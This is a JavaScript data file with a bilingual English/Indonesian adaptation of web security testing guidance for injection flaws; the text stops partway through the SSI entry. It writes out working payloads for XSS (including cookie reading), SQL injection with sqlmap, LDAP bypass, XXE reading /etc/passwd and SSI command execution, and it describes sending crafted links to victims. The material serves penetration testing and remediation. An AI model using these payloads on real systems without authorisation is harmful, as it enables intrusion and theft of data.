/* WSTG Bilingual — 4.8 Injection (23 tests)
   Condensed bilingual adaptation, CC BY-SA 4.0. Registers: t=Teknis, b=Baku, s=Sederhana. */
window.WSTG_DATA = window.WSTG_DATA || [];
window.WSTG_DATA.push({
  order: 7, code: 'INPV',
  name_en: 'Injection',
  desc_en: 'XSS, SQLi, command injection, SSTI, SSRF & deserialization',
  name_id: { t: 'Injeksi (Injection)', b: 'Injeksi', s: 'Menyuntik Input Jahat' },
  desc_id: { t: 'XSS, SQL Injection (SQLi), command injection, SSTI, SSRF & deserialization', b: 'XSS, injeksi SQL, injeksi perintah, SSTI, SSRF & deserialisasi', s: 'Nglempar input jahat biar dieksekusi sistem: XSS, SQLi, sampai ngendalikan server' },
  tests: [

    {
      name_en: 'Testing for Reflected Cross Site Scripting',
      name_id: { t: 'Pengujian Reflected XSS (Reflected Cross Site Scripting)', b: 'Pengujian Cross-Site Scripting Reflektif', s: 'XSS yang Mantul Balik' },
      summary: {
        en: 'User input is echoed into the response without sanitization, so attacker-supplied script runs in another user browser session. Reflected XSS typically rides a crafted link sent to the victim.',
        t: 'Input user dipantulkan ke response tanpa sanitasi, sehingga script buatan penyerang dapat dieksekusi di browser user lain. Reflected XSS biasanya menyebar melalui link buatan yang dikirim ke korban.',
        b: 'Masukan pengguna dipantulkan ke respons tanpa sanitasi, sehingga skrip buatan penyerang dapat dijalankan di peramban pengguna lain. XSS reflektif biasanya menyebar melalui tautan buatan yang dikirim kepada korban.',
        s: 'Input kita muncul balik di halaman tanpa difilter — kalau begitu, script jahat yang kita kirim lewat link bisa jalan di browser orang lain.'
      },
      howto: {
        en: [
          'Map every parameter that reflects input back into the page (search boxes, error text, welcome messages).',
          'Inject a probe like `<script>alert(1)</script>` and check whether it lands raw in the HTML.',
          'If tags are filtered, try event handlers and alternate syntax: `<img src=x onerror=alert(1)>`, `\" onmouseover=alert(1) x=\"`, `<svg onload=alert(1)>`.',
          'Identify the reflection context (HTML body, attribute, JS string) and craft the payload to break out of it.',
          'Assemble the final URL and deliver it through a message the victim would click.'
        ],
        t: [
          'Petakan setiap parameter yang memantulkan input kembali ke halaman (kotak pencarian, teks error, sambutan).',
          'Injeksi probe seperti `<script>alert(1)</script>` dan periksa apakah muncul mentah di HTML.',
          'Jika tag difilter, coba event handler dan sintaks alternatif: `<img src=x onerror=alert(1)>`, `\" onmouseover=alert(1) x=\"`, `<svg onload=alert(1)>`.',
          'Identifikasi konteks refleksi (body HTML, atribut, string JS) dan susun payload untuk keluar dari konteks tersebut.',
          'Rakit URL final dan kirimkan melalui pesan yang akan diklik korban.'
        ],
        b: [
          'Petakan setiap parameter yang memantulkan masukan kembali ke halaman (kotak pencarian, teks galat, sambutan).',
          'Injeksikan pemeriksa seperti `<script>alert(1)</script>` dan periksa apakah muncul mentah di HTML.',
          'Jika tanda disaring, coba pawang peristiwa dan sintaks alternatif: `<img src=x onerror=alert(1)>`, `\" onmouseover=alert(1) x=\"`, `<svg onload=alert(1)>`.',
          'Identifikasi konteks pantulan (isi HTML, atribut, untai JS) dan susun muatan untuk keluar dari konteks tersebut.',
          'Rakit URL final dan kirimkan melalui pesan yang akan diklik korban.'
        ],
        s: [
          'Cari semua tempat yang menampilkan balik apa yang kita ketik — kotak pencarian, pesan error, teks sambutan.',
          'Ketik `<script>alert(1)</script>` — kalau muncul apa adanya di halaman, itu tanda bahaya.',
          'Kalau `<script>` diblokir, coba `<img src=x onerror=alert(1)>` atau `<svg onload=alert(1)>`.',
          'Perhatikan di bagian HTML mana input kita nongol — di dalam atribut beda caranya dengan di body.',
          'Kalau alert muncul, rakit link berisi payload itu dan kirim ke korban.'
        ]
      },
      tools: ['Burp Suite', 'OWASP ZAP', 'XSStrike', 'dalfox', 'browser dev tools'],
      remediation: {
        en: 'Encode output for the exact context (HTML, attribute, JS) with a standard library, treat input as hostile by default, and add a Content-Security-Policy as a second layer.',
        t: 'Encode output sesuai konteks persisnya (HTML, atribut, JS) dengan library standar, perlakukan input sebagai musuh secara default, dan tambahkan Content-Security-Policy sebagai lapisan kedua.',
        b: 'Enkode keluaran sesuai konteks tepatnya (HTML, atribut, JS) dengan pustaka standar, perlakukan masukan sebagai musuh secara bawaan, dan tambahkan Content-Security-Policy sebagai lapisan kedua.',
        s: 'Semua output yang berasal dari user harus di-encode sebelum ditampilkan. Jangan percaya input, dan pasang CSP biar script jahat nggak bisa jalan.'
      }
    },

    {
      name_en: 'Testing for Stored Cross Site Scripting',
      name_id: { t: 'Pengujian Stored XSS (Stored Cross Site Scripting)', b: 'Pengujian Cross-Site Scripting Tersimpan', s: 'XSS yang Tersimpan di Server' },
      summary: {
        en: 'The payload is persisted server-side (profile field, comment, log entry) and fires on every page view, no crafted link needed. Stored XSS hits every visitor and is the more severe variant.',
        t: 'Payload disimpan di server (field profil, komentar, entri log) dan terpicu setiap kali halaman dibuka — tanpa perlu link buatan. Stored XSS mengenai setiap pengunjung dan merupakan varian yang lebih parah.',
        b: 'Muatan disimpan di peladen (bidang profil, komentar, catatan log) dan terpicu setiap kali halaman dibuka — tanpa perlu tautan buatan. XSS tersimpan mengenai setiap pengunjung dan merupakan varian yang lebih parah.',
        s: 'Script jahatnya disimpan permanen di server — di profil, komentar, atau nama. Setiap orang yang buka halaman itu kena, nggak perlu kirimi link satu-satu.'
      },
      howto: {
        en: [
          'Inventory every input that gets stored and later rendered to other users: usernames, comments, bio fields, chat, file names.',
          'Submit a marker like `xssprobe123` in each field, reload the page as another user, and locate the marker in the HTML.',
          'At the stored reflection point, inject `<script>alert(1)</script>` or `<img src=x onerror=alert(document.cookie)>`.',
          'Check whether the app sanitizes on input but decodes before render — stored-then-decoded filters still break.',
          'Verify persistence across sessions and other user accounts to confirm victim reach.'
        ],
        t: [
          'Inventarisasi setiap input yang disimpan lalu dirender ke user lain: username, komentar, field bio, chat, nama file.',
          'Kirim penanda seperti `xssprobe123` di tiap field, muat ulang halaman sebagai user lain, dan cari penanda di HTML.',
          'Di titik refleksi tersimpan, injeksikan `<script>alert(1)</script>` atau `<img src=x onerror=alert(document.cookie)>`.',
          'Periksa apakah aplikasi mensanitasi saat input tapi men-decode sebelum render — filter yang disimpan lalu di-decode tetap bocor.',
          'Verifikasi persistensi lintas sesi dan akun user lain untuk mengonfirmasi jangkauan korban.'
        ],
        b: [
          'Inventarisasi setiap masukan yang disimpan lalu ditampilkan kepada pengguna lain: nama pengguna, komentar, bidang bio, obrolan, nama berkas.',
          'Kirim penanda seperti `xssprobe123` pada tiap bidang, muat ulang halaman sebagai pengguna lain, dan cari penanda di HTML.',
          'Pada titik pantulan tersimpan, injeksikan `<script>alert(1)</script>` atau `<img src=x onerror=alert(document.cookie)>`.',
          'Periksa apakah aplikasi mensanitasi saat masukan namun mengode ulang sebelum tampilan — saringan yang disimpan lalu diurai tetap bocor.',
          'Pastikan keawetan lintas sesi dan akun pengguna lain untuk memastikan jangkauan korban.'
        ],
        s: [
          'Daftar semua input yang disimpan server dan dilihat orang lain: nama user, komentar, bio, chat.',
          'Kirim teks penanda dulu, buka halaman pakai akun lain — cari di mana penanda itu muncul di HTML.',
          'Di titik itu, coba `<script>alert(1)</script>` atau `<img src=x onerror=alert(document.cookie)>`.',
          'Hati-hati: kadang filter jalan saat input, tapi pas ditampilkan malah di-decode ulang — tetap bisa bobol.',
          'Kalau payloadnya bertahan setelah logout dan terlihat user lain, itu Stored XSS beneran.'
        ]
      },
      tools: ['Burp Suite', 'OWASP ZAP', 'XSStrike', 'dalfox', 'browser dev tools'],
      remediation: {
        en: 'Sanitize on render with context-aware encoding, validate stored fields against strict allowlists, and render user content through a sandboxed/escaped pipeline (never raw HTML).',
        t: 'Sanitasi saat render dengan encoding yang sadar konteks, validasi field tersimpan dengan allowlist ketat, dan render konten user melalui pipeline tersandbox/escaped — jangan pernah HTML mentah.',
        b: 'Sanitasi saat tampilan dengan pengodean yang sadar konteks, validasi bidang tersimpan dengan daftar izin ketat, dan tampilkan konten pengguna melalui pipa yang terasing/terampas — jangan pernah HTML mentah.',
        s: 'Bersihkan input saat mau ditampilkan, bukan cuma saat disimpan. Batasi field user dengan daftar yang diizinkan, dan jangan pernah tampilkan HTML mentah dari user.'
      }
    },

    {
      name_en: 'Testing for HTTP Verb Tampering',
      name_id: { t: 'Pengujian HTTP Verb Tampering', b: 'Pengujian Manipulasi Metode HTTP', s: 'Main-main dengan Kata Kerja HTTP' },
      summary: {
        en: 'Many apps enforce auth only on GET/POST; switching the method to PUT, DELETE, HEAD, or a made-up verb can bypass the check entirely because the handler still resolves. A classic auth-bypass vector.',
        t: 'Banyak aplikasi hanya menegakkan auth pada GET/POST; mengganti method ke PUT, DELETE, HEAD, atau verb buatan bisa melewati pemeriksaan karena handler tetap tereksekusi. Vektor bypass auth yang klasik.',
        b: 'Banyak aplikasi hanya menegakkan autentikasi pada GET/POST; mengganti metode ke PUT, DELETE, HEAD, atau metode buatan dapat melewati pemeriksaan karena penangan tetap berjalan. Vektor pengelakan autentikasi yang klasik.',
        s: 'Server kadang cuma nge-cek login untuk GET dan POST. Kalau kita ganti methodnya jadi PUT atau HEAD, pemeriksaan bisa kelewatan tapi halamannya tetap kebuka.'
      },
      howto: {
        en: [
          'Capture a protected request in Burp Repeater (e.g., `GET /admin/users` that returns 403).',
          'Resend it with alternative verbs: `PUT /admin/users`, `DELETE /admin/users`, `HEAD /admin/users`.',
          'Try a nonexistent verb like `CATS /admin/users` — some frameworks route by path and ignore the verb check.',
          'Compare response codes and bodies across verbs; a 200 where 403 appeared is a bypass.',
          'Extend findings to state-changing endpoints — verb tampering on delete/update routes is the real risk.'
        ],
        t: [
          'Tangkap request yang dilindungi di Burp Repeater (mis. `GET /admin/users` yang menghasilkan 403).',
          'Kirim ulang dengan verb alternatif: `PUT /admin/users`, `DELETE /admin/users`, `HEAD /admin/users`.',
          'Coba verb yang tidak ada seperti `CATS /admin/users` — sebagian framework meroute berdasarkan path dan mengabaikan cek verb.',
          'Bandingkan kode dan body response antar verb; 200 di tempat yang tadinya 403 berarti bypass.',
          'Luaskan temuan ke endpoint yang mengubah state — verb tampering pada route delete/update adalah risiko sesungguhnya.'
        ],
        b: [
          'Tangkap permintaan yang dilindungi di Burp Repeater (mis. `GET /admin/users` yang menghasilkan 403).',
          'Kirim ulang dengan metode alternatif: `PUT /admin/users`, `DELETE /admin/users`, `HEAD /admin/users`.',
          'Coba metode tidak baku seperti `CATS /admin/users` — sebagian kerangka kerja merutekan berdasarkan jalur dan mengabaikan pemeriksaan metode.',
          'Bandingkan kode dan isi respons antar metode; 200 di tempat yang semula 403 berarti pengelakan.',
          'Luaskan temuan ke endpoint pengubah keadaan — manipulasi metode pada rute hapus/ubah adalah risiko sesungguhnya.'
        ],
        s: [
          'Rekam request admin yang biasanya ditolak (403) di Burp Repeater.',
          'Ganti methodnya jadi `PUT`, `DELETE`, atau `HEAD`, kirim ulang.',
          'Coba method ngawur juga, misal `CATS /admin/users` — kadang servernya bingung dan tetap buka halaman.',
          'Kalau yang tadinya ditolak sekarang 200, itu bypass.',
          'Bahaya terbesar kalau endpointnya bisa hapus atau ubah data.'
        ]
      },
      tools: ['Burp Suite', 'curl', 'netcat', 'OWASP ZAP'],
      remediation: {
        en: 'Enforce authorization at the handler level, not the verb: reject unexpected methods with 405 and apply the same access control to every verb a route accepts.',
        t: 'Tegakkan otorisasi di level handler, bukan verb: tolak method tak terduga dengan 405 dan terapkan kontrol akses yang sama untuk setiap verb yang diterima route.',
        b: 'Tegakkan otorisasi di tingkat penangan, bukan pada metode: tolak metode tak terduga dengan 405, dan berlakukan kontrol akses yang sama untuk setiap metode yang diterima rute.',
        s: 'Pemeriksaan izin harus ada di dalam handler, bukan cuma nge-cek methodnya. Method yang nggak dikenal harus ditolak 405.'
      }
    },

    {
      name_en: 'Testing for HTTP Parameter Pollution',
      name_id: { t: 'Pengujian HTTP Parameter Pollution (HPP)', b: 'Pengujian Polusi Parameter HTTP', s: 'Ngerusak Pakai Parameter Duplikat' },
      summary: {
        en: 'Sending the same parameter twice (`?role=user&role=admin`) exploits the fact that different stacks pick different values — first, last, or joined. Security logic and business logic can disagree, opening bypasses.',
        t: 'Mengirim parameter yang sama dua kali (`?role=user&role=admin`) memanfaatkan fakta bahwa stack berbeda memilih nilai berbeda — pertama, terakhir, atau digabung. Logika keamanan dan logika bisnis bisa tidak sepakat, membuka celah bypass.',
        b: 'Pengiriman parameter yang sama sebanyak dua kali (`?role=user&role=admin`) memanfaatkan kenyataan bahwa setiap tumpukan memilih nilai secara berbeda — bisa yang pertama, yang terakhir, atau gabungan keduanya. Logika keamanan dan logika bisnis pun dapat berselisih, sehingga terbuka celah pengelakan.',
        s: 'Kita kirim dua nilai untuk satu parameter — `?role=user&role=admin`. Server kadang baca yang pertama buat cek keamanan, tapi baca yang kedua buat jalanin fitur. Itu celah.'
      },
      howto: {
        en: [
          'Identify parameters that influence logic: `role`, `amount`, `action`, `user`, `debug`.',
          'Duplicate one in the query string: `POST /transfer?to=alice&amount=100&amount=1`.',
          'Compare app behavior against the single-value baseline to learn which value each consumer reads.',
          'Try the duplicate in different spots — query, POST body, and cookies simultaneously (`?action=view` in body plus `action=delete` in query).',
          'Target validation mismatches: send `amount=100&amount=1` so validation sees one value and execution sees another.'
        ],
        t: [
          'Identifikasi parameter yang memengaruhi logika: `role`, `amount`, `action`, `user`, `debug`.',
          'Duplikasi salah satunya di query string: `POST /transfer?to=alice&amount=100&amount=1`.',
          'Bandingkan perilaku aplikasi dengan baseline satu nilai untuk memetakan nilai mana yang dibaca tiap konsumen.',
          'Coba duplikasi di lokasi berbeda — query, body POST, dan cookie secara bersamaan (`?action=view` di body plus `action=delete` di query).',
          'Targetkan ketidaksesuaian validasi: kirim `amount=100&amount=1` agar validasi membaca satu nilai dan eksekusi membaca nilai lain.'
        ],
        b: [
          'Identifikasi parameter yang memengaruhi logika: `role`, `amount`, `action`, `user`, `debug`.',
          'Gandakan salah satunya pada untai kueri: `POST /transfer?to=alice&amount=100&amount=1`.',
          'Bandingkan perilaku aplikasi dengan tolok ukur satu nilai untuk memetakan nilai mana yang dibaca tiap pemakai.',
          'Coba duplikasi pada lokasi berbeda — kueri, isi POST, dan kuki secara bersamaan (`?action=view` di isi plus `action=delete` di kueri).',
          'Bidik ketidaksesuaian validasi: kirim `amount=100&amount=1` agar validasi membaca satu nilai dan eksekusi membaca nilai lain.'
        ],
        s: [
          'Cari parameter yang ngaruh ke logika: `role`, `amount`, `action`.',
          'Kirim parameter yang sama dua kali: `?amount=100&amount=1`.',
          'Amati perilakunya dibanding request normal — kadang server baca yang pertama, kadang yang terakhir.',
          'Coba juga gabungan: satu di query, satu di body, satu di cookie.',
          'Serangannya: bikin validasi baca nilai yang aman, tapi fiturnya jalan pakai nilai yang kita mau.'
        ]
      },
      tools: ['Burp Suite', 'curl', 'OWASP ZAP'],
      remediation: {
        en: 'Reject duplicate parameters on the server instead of silently merging, and never let different components read the same parameter through different parsers.',
        t: 'Tolak parameter duplikat di server alih-alih menggabungkannya diam-diam, dan jangan biarkan komponen berbeda membaca parameter yang sama melalui parser berbeda.',
        b: 'Tolak parameter ganda pada peladen alih-alih menggabungkannya diam-diam, dan jangan biarkan komponen berbeda membaca parameter yang sama melalui pengurai berbeda.',
        s: 'Server harus nolak parameter kembar, bukan digabung diam-diam. Satu parameter harus dibaca satu sumber saja.'
      }
    },

    {
      name_en: 'Testing for SQL Injection',
      name_id: { t: 'Pengujian SQL Injection (SQLi)', b: 'Pengujian Injeksi SQL', s: 'Nyerang Database Lewat Input' },
      summary: {
        en: 'Unsanitized input is concatenated into a SQL query, letting the attacker alter the query logic — bypass login, dump tables, or in stacked-query cases write to the database. Still the most damaging classic web flaw.',
        t: 'Input tanpa sanitasi digabung langsung ke query SQL, sehingga penyerang bisa mengubah logika query — bypass login, dump tabel, atau pada stacked query menulis ke database. Masalah web klasik yang paling merusak.',
        b: 'Masukan tanpa sanitasi digabung langsung ke kueri SQL, sehingga penyerang dapat mengubah logika kueri — mengelak login, membongkar tabel, atau pada kueri bertumpuk menulis ke pangkalan data. Masalah web klasik yang paling merusak.',
        s: 'Input kita disambung mentah ke perintah database — bisa dipelintir buat masuk tanpa password, nyuri semua data, bahkan nimpa server.'
      },
      howto: {
        en: [
          'Probe a login or search field with a single quote: `admin\'` — a 500 error or changed behavior suggests the input reaches SQL.',
          'Try the classic auth bypass: `admin\' OR \'1\'=\'1` and `\' OR 1=1--` in user and password fields.',
          'Confirm with a boolean oracle: `\' AND 1=1--` vs `\' AND 1=2--` and diff the responses.',
          'Enumerate columns/order with `ORDER BY 3--`, then extract data with `UNION SELECT username, password FROM users--`.',
          'Automate full extraction with `sqlmap -u \"http://target.com/item?id=1\" --dbs --batch`.'
        ],
        t: [
          'Probe field login atau pencarian dengan satu tanda kutip: `admin\'` — error 500 atau perilaku yang berubah mengindikasikan input sampai ke SQL.',
          'Coba bypass auth klasik: `admin\' OR \'1\'=\'1` dan `\' OR 1=1--` pada field user dan password.',
          'Konfirmasi dengan oracle boolean: `\' AND 1=1--` vs `\' AND 1=2--` lalu bandingkan response-nya.',
          'Enumerasi kolom/urutan dengan `ORDER BY 3--`, lalu ekstrak data dengan `UNION SELECT username, password FROM users--`.',
          'Otomatiskan ekstraksi penuh dengan `sqlmap -u \"http://target.com/item?id=1\" --dbs --batch`.'
        ],
        b: [
          'Uji bidang login atau pencarian dengan satu tanda kutip: `admin\'` — galat 500 atau perilaku yang berubah menandakan masukan sampai ke SQL.',
          'Coba pengelakan autentikasi klasik: `admin\' OR \'1\'=\'1` dan `\' OR 1=1--` pada bidang pengguna dan sandi.',
          'Pastikan dengan perbandingan boolean: `\' AND 1=1--` vs `\' AND 1=2--` lalu bandingkan responsnya.',
          'Cacah kolom/urutan dengan `ORDER BY 3--`, lalu ekstrak data dengan `UNION SELECT username, password FROM users--`.',
          'Otomatiskan ekstraksi penuh dengan `sqlmap -u \"http://target.com/item?id=1\" --dbs --batch`.'
        ],
        s: [
          'Ketik tanda kutip satu di form login: `admin\'` — kalau muncul error aneh, ada indikasi SQLi.',
          'Coba trik klasik di kolom user: `\' OR 1=1--` — kalau lolos login, itu bug.',
          'Tes banding: `\' AND 1=1--` vs `\' AND 1=2--` — kalau halamannya beda, query kita ngefek.',
          'Ukur jumlah kolom dengan `ORDER BY 3--`, naik terus sampai error, lalu `UNION SELECT username, password FROM users--`.',
          'Kalau mau praktis: `sqlmap -u \"http://target.com/item?id=1\" --dbs --batch` — dia kerjain semua.'
        ]
      },
      tools: ['sqlmap', 'Burp Suite', 'SQLninja', 'NoSQLMap', 'ghauri'],
      remediation: {
        en: 'Use parameterized queries or prepared statements everywhere — never concatenate input into SQL — plus least-privilege database accounts and generic error pages.',
        t: 'Gunakan parameterized query/prepared statement di semua tempat — jangan pernah menggabung input ke SQL — ditambah akun database least-privilege dan halaman error generik.',
        b: 'Gunakan kueri berparameter atau prepared statement di semua tempat — jangan pernah menggabung masukan ke SQL — ditambah akun pangkalan data hak minimum dan halaman galat generik.',
        s: 'Semua query harus pakai parameter, bukan nyambung string mentah. Batasi hak akses database, dan jangan tampilkan error mentah.'
      }
    },

    {
      name_en: 'Testing for LDAP Injection',
      name_id: { t: 'Pengujian LDAP Injection', b: 'Pengujian Injeksi LDAP', s: 'Nyerang Direktori LDAP' },
      summary: {
        en: 'Input is concatenated into an LDAP filter, so metacharacters like `*`, `(`, `)` and `\\` rewrite the query — commonly yielding authentication bypass or directory-wide data exposure.',
        t: 'Input digabung langsung ke filter LDAP, sehingga metakarakter seperti `*`, `(`, `)` dan `\\` menulis ulang query — umumnya menghasilkan bypass authentication atau bocornya seluruh direktori.',
        b: 'Masukan digabung langsung ke saringan LDAP, sehingga metakarakter seperti `*`, `(`, `)` dan `\\` menulis ulang kueri — umumnya menghasilkan pengelakan autentikasi atau bocornya seluruh direktori.',
        s: 'Server LDAP perusahaan juga bisa disuntik. Karakter khusus bikin filternya jadi \"cocok semua\" — kita bisa masuk tanpa password beneran.'
      },
      howto: {
        en: [
          'Find login or search forms that plausibly query LDAP (enterprise apps, SSO pages, directory searches).',
          'Inject filter metacharacters and observe: `*` in a user field, `)(objectClass=*)` after a username.',
          'Try the auth-bypass classic: `username=*)(uid=*))(|(uid=*` — crafted to close the filter and match any entry.',
          'Test wildcard expansion in search fields: `a*` returning every entry indicates the filter is attacker-controlled.',
          'Confirm by blind techniques (boolean filters like `*)(cn=admin))(|(cn=x`) when errors are silent.'
        ],
        t: [
          'Cari form login atau pencarian yang kemungkinan meng-query LDAP (aplikasi enterprise, halaman SSO, pencarian direktori).',
          'Injeksi metakarakter filter dan amati: `*` di field user, `)(objectClass=*)` setelah username.',
          'Coba bypass auth klasik: `username=*)(uid=*))(|(uid=*` — dirancang menutup filter dan cocok dengan entri apa pun.',
          'Uji ekspansi wildcard di field pencarian: `a*` yang menghasilkan semua entri menandakan filter dikendalikan penyerang.',
          'Konfirmasi dengan teknik blind (filter boolean seperti `*)(cn=admin))(|(cn=x`) saat error tidak terlihat.'
        ],
        b: [
          'Cari formulir login atau pencarian yang kemungkinan menanya LDAP (aplikasi perusahaan, halaman SSO, pencarian direktori).',
          'Injeksikan metakarakter saringan dan amati: `*` pada bidang pengguna, `)(objectClass=*)` setelah nama pengguna.',
          'Coba pengelakan autentikasi klasik: `username=*)(uid=*))(|(uid=*` — dirancang menutup saringan dan cocok dengan entri apa pun.',
          'Uji perluasan wilayah kartu pada bidang pencarian: `a*` yang menghasilkan semua entri menandakan saringan dikendalikan penyerang.',
          'Pastikan dengan teknik buta (saringan boolean seperti `*)(cn=admin))(|(cn=x`) ketika galat tak terlihat).'
        ],
        s: [
          'Form login yang nyambung ke server LDAP perusahaan biasanya targetnya.',
          'Masukkan karakter `*` atau kurung di kolom user — kalau hasilnya jadi aneh atau kebuka semua, filternya bisa kita bentuk.',
          'Payload klasik: `*)(uid=*))(|(uid=*` — bikin filter jadi cocok dengan siapa saja.',
          'Di kolom pencarian, coba `a*` — kalau semua entri keluar, kita pegang kendali filternya.',
          'Kalau errornya nggak kelihatan, bandingkan respons dengan filter yang true dan false.'
        ]
      },
      tools: ['ldapsearch', 'Burp Suite', 'JXplorer', 'Softerra LDAP Browser'],
      remediation: {
        en: 'Escape LDAP metacharacters with a dedicated escaping function before building filters, and construct queries from a whitelist of allowed characters and values.',
        t: 'Escape metakarakter LDAP dengan fungsi escaping khusus sebelum membangun filter, dan susun query dari whitelist karakter dan nilai yang diizinkan.',
        b: 'Enkode karakter khusus LDAP dengan fungsi pengodean khusus sebelum membangun saringan, dan susun kueri dari daftar izin karakter dan nilai yang diizinkan.',
        s: 'Karakter khusus di LDAP wajib di-escape dulu sebelum masuk filter. Batasi juga karakter apa aja yang boleh diketik user.'
      }
    },

    {
      name_en: 'Testing for XML Injection',
      name_id: { t: 'Pengujian XML Injection', b: 'Pengujian Injeksi XML', s: 'Ngerusak Data XML' },
      summary: {
        en: 'User input lands inside an XML document the server later parses, so crafted tags and entities can alter structure, inject extra fields, or — via XML entities — read local files.',
        t: 'Input user masuk ke dokumen XML yang kemudian diparse server, sehingga tag dan entity buatan bisa mengubah struktur, menyisipkan field ekstra, atau — lewat XML entity — membaca file lokal.',
        b: 'Masukan pengguna masuk ke dokumen XML yang kemudian diurai peladen, sehingga tanda dan entitas buatan dapat mengubah struktur, menyisipkan bidang ekstra, atau — melalui entitas XML — membaca berkas lokal.',
        s: 'Data kita bisa masuk ke dalam dokumen XML. Dengan nyisipin tag sendiri, kita bisa nambahin field atau bikin file server kebaca.'
      },
      howto: {
        en: [
          'Find requests whose bodies are XML (SOAP APIs, SSO endpoints) and locate the fields you control.',
          'Inject a structural marker: `email@test.com<foo>bar</foo>` and see whether new tags survive the parse.',
          'Try adding whole elements: `<isAdmin>true</isAdmin>` in a user profile payload.',
          'If entities resolve, test internal ones first (`&lt;` then `&amp;`), then external: `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` in the DOCTYPE.',
          'Observe parser behavior differences and whether injected structure changes the application response.'
        ],
        t: [
          'Cari request dengan body XML (API SOAP, endpoint SSO) dan temukan field yang Anda kontrol.',
          'Injeksi penanda struktural: `email@test.com<foo>bar</foo>` dan lihat apakah tag baru bertahan setelah parse.',
          'Coba menambahkan elemen utuh: `<isAdmin>true</isAdmin>` pada payload profil user.',
          'Jika entity diresolves, uji internal dulu (`&lt;` lalu `&amp;`), kemudian eksternal: `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` di DOCTYPE.',
          'Amati perbedaan perilaku parser dan apakah struktur yang diinjeksi mengubah response aplikasi.'
        ],
        b: [
          'Cari permintaan berisi XML (API SOAP, endpoint SSO) dan temukan bidang yang Anda kendalikan.',
          'Injeksikan penanda struktural: `email@test.com<foo>bar</foo>` dan lihat apakah tanda baru bertahan setelah penguraian.',
          'Coba menambahkan elemen utuh: `<isAdmin>true</isAdmin>` pada muatan profil pengguna.',
          'Jika entitas diurai, uji internal dahulu (`&lt;` lalu `&amp;`), kemudian eksternal: `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` pada DOCTYPE.',
          'Amati perbedaan perilaku pengurai dan apakah struktur yang disuntik mengubah respons aplikasi.'
        ],
        s: [
          'Cari request yang isinya XML — biasanya API SOAP.',
          'Tambahin tag buatan di field yang bisa kita isi, lihat apakah diterima.',
          'Sisipkan field baru seperti `<isAdmin>true</isAdmin>` — kadang langsung dipercaya.',
          'Kalau entity jalan, coba `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` — itu bisa baca file server.',
          'Bandingkan responsnya dengan request normal.'
        ]
      },
      tools: ['Burp Suite', 'soapUI', 'xmlmap', 'xxeserv', 'OWASP ZAP'],
      remediation: {
        en: 'Sanitize or reject XML metacharacters in fields destined for XML documents, and disable external entity resolution on every parser (XXE defense also blocks structural injection fallout).',
        t: 'Sanitasi atau tolak metakarakter XML pada field yang ditujukan ke dokumen XML, dan matikan resolusi entity eksternal di semua parser (pertahanan XXE juga meredam dampak injeksi struktural).',
        b: 'Sanitasi atau tolak karakter khusus XML pada bidang yang ditujukan ke dokumen XML, dan matikan penguraian entitas eksternal pada semua pengurai (pertahanan XXE juga meredam dampak injeksi struktural).',
        s: 'Field yang bakal jadi XML harus dibersihin dari karakter khusus, dan parser harus matikan fitur entity luar.'
      }
    },

    {
      name_en: 'Testing for SSI Injection',
      name_id: { t: 'Pengujian SSI Injection (Server-Side Includes)', b: 'Pengujian Injeksi SSI', s: 'Nyerang Lewat SSI' },
      summary: {
        en: 'When pages pass through an SSI-enabled server (common on legacy Nginx/Apache setups), injected `<!--#exec-->` directives execute OS or script commands. Rare today, instant RCE where it exists.',
        t: 'Saat halaman melewati server dengan SSI aktif (umum pada setup Nginx/Apache lama), direktif `<!--#exec-->` yang diinjeksi bisa mengeksekusi perintah OS atau script. Langka saat ini, tetapi langsung RCE di tempat yang rentan.',
        b: 'Ketika halaman melewati peladen dengan SSI aktif (umum pada susunan Nginx/Apache lama), arahan `<!--#exec-->` yang disuntik dapat menjalankan perintah OS atau skrip. Langka saat ini, tetapi langsung menjadi RCE di tempat yang rentan.',
        s: 'Server tua kadang masih ngejalanin perintah khusus di dalam HTML. Kalau kita bisa nyisipin `<!--#exec ...-->`, kita bisa jalanin perintah di server.'
      },
      howto: {
        en: [
          'Detect SSI in responses: pages with `.shtml` extensions or comments like `<!--#config` are strong hints.',
          'Inject a time-based probe into a reflected field: `<!--#printenv -->` and check for environment output.',
          'Escalate to file inclusion: `<!--#include virtual=\"/etc/passwd\" -->`.',
          'Attempt command execution: `<!--#exec cmd=\"id\" -->` or `<!--#exec cmd=\"ls /\" -->`.',
          'Confirm the output of your commands appears in the rendered page — that is full SSI exploitation.'
        ],
        t: [
          'Deteksi SSI pada response: halaman berekstensi `.shtml` atau komentar seperti `<!--#config` adalah petunjuk kuat.',
          'Injeksi probe berbasis waktu di field refleksi: `<!--#printenv -->` dan periksa keluaran environment.',
          'Eskalasi ke file inclusion: `<!--#include virtual=\"/etc/passwd\" -->`.',
          'Coba eksekusi perintah: `<!--#exec cmd=\"id\" -->` atau `<!--#exec cmd=\"ls /\" -->`.',
          'Pastikan keluaran perintah muncul di halaman yang dirender — itu eksploitasi SSI penuh.'
        ],
        b: [
          'Deteksi SSI pada respons: halaman berekstensi `.shtml` atau komentar seperti `<!--#config` adalah petunjuk kuat.',
          'Injeksikan pemeriksa berbasis waktu pada bidang pantulan: `<!--#printenv -->` dan periksa keluaran lingkungan.',
          'Naikkan ke penyertaan berkas: `<!--#include virtual=\"/etc/passwd\" -->`.',
          'Coba eksekusi perintah: `<!--#exec cmd=\"id\" -->` atau `<!--#exec cmd=\"ls /\" -->`.',
          'Pastikan keluaran perintah muncul pada halaman yang ditampilkan — itu eksploitasi SSI penuh.'
        ],
        s: [
          'Halaman `.shtml` itu tanda server masih dukung SSI.',
          'Ketik `<!--#printenv -->` di field — kalau keluar daftar environment, SSI hidup.',
          'Coba baca file: `<!--#include virtual=\"/etc/passwd\" -->`.',
          'Naik ke perintah: `<!--#exec cmd=\"id\" -->` — kalau keluarannya nongol di halaman, kita pegang server.',
          'Dokumentasikan semua output perintah sebagai bukti.'
        ]
      },
      tools: ['Burp Suite', 'curl', 'SSI injection payload lists'],
      remediation: {
        en: 'Disable SSI parsing on user-influenced pages, or at minimum block `exec` directives; encode user input before it lands in HTML destined for SSI processing.',
        t: 'Matikan parsing SSI pada halaman yang terpengaruh user, atau minimal blokir direktif `exec`; encode input user sebelum masuk ke HTML yang diproses SSI.',
        b: 'Matikan penguraian SSI pada halaman yang dipengaruhi pengguna, atau minimal blokir arahan `exec`; enkode masukan pengguna sebelum masuk ke HTML yang diproses SSI.',
